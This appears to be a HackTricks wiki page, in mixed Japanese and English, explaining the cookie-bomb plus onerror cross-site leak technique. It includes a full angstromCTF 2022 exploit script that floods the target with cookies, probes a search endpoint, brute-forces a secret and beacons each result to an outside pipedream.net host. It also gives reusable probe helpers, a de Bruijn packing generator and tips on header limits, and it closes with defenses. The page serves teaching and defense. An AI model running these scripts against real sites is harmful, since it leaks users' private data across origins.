# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 被害者のブラウザにターゲットオリジン向けの多数／大きな cookies を詰め込んで、以降のリクエストがサーバ／リクエストの制限（request header size、リダイレクト時の URL 長など）に達するようにする手法。
- Error-event oracle: クロスオリジンのエンドポイントを <script>（または他のサブリソース）でプローブし、onload vs onerror の差で状態を判別する手法。

High level idea
- テストしたい 2 つの状態（例：検索の “hit” と “miss”）で挙動が異なるターゲットエンドポイントを見つける。
- “hit” パスが大規模なリダイレクトチェーンや長い URL を引き起こし、”miss” パスは短いままであるようにする。多数の cookies でリクエストヘッダを膨らませ、”hit” のみがサーバ制限を超えて HTTP エラー（例：431/414/400）を返すようにする。エラーによって onerror イベントが発生し、XS-Search のオラクルになる。

When does this work
- 被害者のブラウザがターゲットに対して cookies を送信させられる（例：cookies が SameSite=None になっている、または popup で window.open を使ってファーストパーティコンテキストでセットできる）。
- 任意の cookies を設定できるアプリ機能を悪用できる（例："save preference" エンドポイントが制御可能な入力名/値を Set-Cookie に変換する）か、認証後のリダイレクトに攻撃者制御のデータを URL に組み込める。
- サーバが 2 状態で異なる反応をし、ヘッダ／URL を膨らませた結果、片方の状態だけが制限を超えてエラー応答を返し、onerror をトリガーする。

Note on server errors used as the oracle
- 431 Request Header Fields Too Large は cookies によってリクエストヘッダが膨らんだ際に一般的に返される。長いリクエストターゲットでは 414 URI Too Long やサーバ固有の 400 が返ることがある。これらはいずれもサブリソース読み込みの失敗となり onerror を発火させる。[MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
次のスクリプト（公開された writeup から）は、攻撃者が任意の cookies を挿入できる機能を悪用し、クロスオリジンの検索エンドポイントを script として読み込む。クエリが正しいとサーバがリダイレクトを行い、cookie の膨張と合わさってサーバ制限を超えエラーステータスを返すため script.onerror が発火する。クエリが間違っている場合は何も起こらない。
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
なぜ popup (window.open) を使うのか？
- 近年、多くのブラウザが third-party cookies を徐々にブロックするようになっています。ターゲットへトップレベルのウィンドウを開くとクッキーが first‑party になるため、ターゲットからの Set-Cookie レスポンスが有効になり、third‑party cookie の制限下でも cookie-bomb ステップを実行できます。

2024–2025 の cookie 可用性に関する注記
- Chromium-based ブラウザは、ユーザーやサイトがオプトアウトしない限り依然として third‑party cookies を送信することが多いですが、Safari と Firefox はデフォルトでほとんどの third‑party cookies をブロックします。両方を想定して計画してください: (1) first‑party cookie planting flow (window.open + auto-submit to a cookie-setting endpoint) を使い、続いて (2) それらのクッキーが送信された場合にのみ成功する subresource でプローブします。もし third‑party cookies がブロックされている場合は、プローブを same-site コンテキストに移動してください（例: same-site gadget を介して popup 内で oracle を実行し、postMessage や a beacon で boolean を exfiltrate して自分のサーバへ送る）。

Generic probing helper
もし既にターゲットオリジン上で多数のクッキーを設定する手段（first-party）を持っているなら、この最小限の oracle を、成功/失敗が異なるネットワーク結果（status/MIME/redirect）をもたらす任意のエンドポイントに対して再利用できます：
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
代替 tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
上級: de Bruijn–based cookie packing (CTF-proven)
- アプリが大きな cookie 値を制御できる場合、各 probe に de Bruijn シーケンスを付加することで効率的に推測をパックできます。これにより各 probe あたりのオーバーヘッドを小さく保ちながら、heavy branch が正しいプレフィックスの場合にのみ一貫して重くなることを保証します。Example generator for |Σ| symbols of length n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- 実践的なアイデア: 値が prefix + deBruijn(k,n) となる複数の cookies を設定する。テスト中の prefix が正しい場合にのみサーバが重いパス（例: 長い cookie や URL を反映する追加の redirect）を取るようにし、その重い処理と cookie の膨張が組み合わさると制限を越えて onerror が反転する。LA CTF 2024 の公開ソルバーがこの手法を使用している。

Tips to build the oracle
- Force the “positive” state to be heavier: 条件が true の場合のみ追加の redirect を連鎖させる、または redirect URL が予測された prefix に応じて大きくなるようにユーザー入力を反映させる。
- Inflate headers: cookie bombing を繰り返して “heavy” パスで一貫したエラーが観測されるまで続ける。Servers は一般にヘッダサイズに上限を設けており、多数の cookies があると早く失敗する。
- Stabilize: 並列で複数の cookie 設定操作を実行し、probe を繰り返してタイミングやキャッシュのノイズを平均化する。
- Bust caches and avoid pooling artifacts: probe URLs にランダムな `#fragment` や `?r=` を付与し、window.open ループを使う場合はウィンドウ名を都度変えることを優先する。
- Alternate subresources: `<script>` がフィルタされる場合は `<link rel=stylesheet>` や `<img>` を試す。onload/onerror の真偽がオラクルであり、コンテンツを解析する必要はない。

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. 2025年10月時点で Cloudflare はエッジでリクエストヘッダ合計 128 KB（URL は 16 KB）を文書化しているため、ターゲットがその背後にある場合はより多く／大きな cookies が必要になることがある。その他のスタック（例: Apache の LimitRequestFieldSize）はヘッダ行あたり概ね ~8 KB 前後で早期にエラーになることが多い。Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- 条件付きの redirects や状態間で大きく異なるレスポンスサイズを避ける。状態に関係なく同じ status、同じ content type、類似したボディ長を返す。
- Block cross-site subresource probes:
- SameSite cookies: センシティブな cookie を SameSite=Lax または Strict に設定し、<script src> のようなサブリソースリクエストでそれらが送信されないようにする。認証トークンには可能なら Strict を推奨。
- Fetch Metadata: Resource Isolation Policy を強制してクロスサイトのサブリソース読み込みを拒否する（例: Sec-Fetch-Site != same-origin/same-site の場合）。
- Cross-Origin-Resource-Policy (CORP): クロスオリジンのサブリソースとして埋め込むべきでないエンドポイントには CORP: same-origin（少なくとも same-site）を設定する。
- X-Content-Type-Options: nosniff を設定し、JSON/HTML エンドポイントで正しい Content-Type を返して load-as-script の特異挙動を避ける。
- Reduce header/URL amplification:
- 設定する cookie の数/サイズに上限を設ける；任意のフォームフィールドを Set-Cookie に変換する機能はサニタイズする。
- リダイレクトで反映するデータは正規化または切り詰める；攻撃者制御の長い文字列を Location URL に埋め込まない。
- サーバの上限を一貫させ、失敗時は均一に扱う（ある分岐だけ特別なエラーページを返すのは避ける）。

Notes
- このクラスの攻撃は広く “Error Events” XS-Leaks として議論される。cookie-bomb ステップは、サーバ上限を超えるのを一方の分岐だけで起こさせ、信頼できるブール型オラクルを生成するための便利な手段に過ぎない。



## References
- XS-Leaks: Error Events（onerror/onload をオラクルとして）: https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large（多くの cookie の存在で発生しやすい）: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- de Bruijn cookie-bomb オラクルを示す LA CTF 2024 の writeup: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
